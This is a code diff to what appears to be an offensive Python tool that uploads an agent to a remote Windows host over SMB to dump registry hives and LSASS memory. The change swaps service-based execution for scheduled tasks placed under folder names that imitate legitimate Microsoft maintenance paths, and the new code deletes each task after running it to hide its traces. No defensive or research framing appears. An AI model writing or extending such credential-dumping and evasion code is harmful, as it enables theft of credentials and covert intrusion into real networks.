@@ -12,6 +12,7 @@ from dataclasses import dataclass
 
 from ..smb import SmbSession
 from ..rpc.svcctl import SvcCtl
+from ..rpc.tsch import TaskScheduler
 
 
 AGENT_MAGIC = b'PYD\x01'
@@ -64,6 +65,13 @@ _PIPE_PREFIXES = [
     "samr_", "srvsvc_",
 ]
 
+_TASK_PATHS = [
+    "\\Microsoft\\Windows\\Maintenance\\",
+    "\\Microsoft\\Windows\\Servicing\\",
+    "\\Microsoft\\Windows\\NetTrace\\",
+    "\\Microsoft\\Windows\\DeviceSetup\\",
+]
+
 
 @dataclass
 class AgentResult:
@@ -98,16 +106,15 @@ class PipeDump:
 
     def execute(self, do_registry: bool = True, lsass_pid: int = 0) -> AgentResult:
         pipe_name = secrets.choice(_PIPE_PREFIXES) + random_name(6)
-        base_name = secrets.choice(_SERVICE_NAMES)
-        svc_name = f"{base_name}_{secrets.randbelow(900) + 100}"
-        display_name = _DISPLAY_NAMES[base_name]
         agent_name = secrets.choice(_AGENT_NAMES)
+        task_path = secrets.choice(_TASK_PATHS) + random_name(8)
 
         mode = (1 if do_registry else 0) | (2 if lsass_pid > 0 else 0)
         self._upload_agent(agent_name)
-        binary_path = f"C:\\Windows\\Temp\\{agent_name} {mode} {lsass_pid} {pipe_name}"
+        cmd = f"C:\\Windows\\Temp\\{agent_name}"
+        args = f"{mode} {lsass_pid} {pipe_name}"
 
-        t = threading.Thread(target=self._exec_via_service, args=(svc_name, display_name, binary_path), daemon=True)
+        t = threading.Thread(target=self._exec_via_task, args=(task_path, cmd, args), daemon=True)
         t.start()
 
         try:
@@ -159,6 +166,21 @@ class PipeDump:
             security_hive=hives[2],
             lsass_dump=lsass_dump,
         )
+
+    def _exec_via_task(self, task_path: str, command: str, arguments: str) -> None:
+        with self.session.open_pipe("atsvc") as pipe:
+            ts = TaskScheduler(pipe)
+            ts.bind(self.session.username, self.session.password,
+                    self.session.nt_hash)
+            ts.register_task(task_path, command, arguments)
+            try:
+                ts.run_task(task_path)
+            except Exception:
+                pass
+            try:
+                ts.delete_task(task_path)
+            except Exception:
+                pass
 
     def _exec_via_service(self, svc_name: str, display_name: str, cmd: str) -> None:
         with self.session.open_pipe("svcctl") as pipe:
